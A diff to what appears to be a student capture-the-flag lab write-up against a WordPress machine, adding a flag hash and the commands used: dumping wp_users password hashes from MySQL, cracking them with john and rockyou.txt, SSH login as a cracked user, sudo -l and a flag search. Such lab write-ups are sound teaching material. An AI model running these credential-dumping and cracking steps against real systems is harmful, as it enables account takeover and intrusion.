@@ -108,6 +108,31 @@ SELECT * FROM wp_posts;
 ![Password for database](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/SQL%20DB%20Login%20info.png)
 
 
+flag4 hash: 715dea6c055b9fe3337544932f2941ce3
+
+The commands used were:
+(while logged in the database)
+
+mysql> select * from wp_users;
+
+select user_login, user_pass, from wp_users;
+
+copy and paste values into attacker machine and create file
+
+using newly created wordlist, use command: john --wordlist=/usr/share/wordlists/rockyou.txt hashedusers.txt
+
+this out puts user Steven's password
+
+login as steven > ssh steven@192.168.1.110 -p 22
+
+sudo -l
+
+cd /
+
+find -name 'flag*.txt'
+
+
+
 
 
 # Blue Team: Summary of Operations
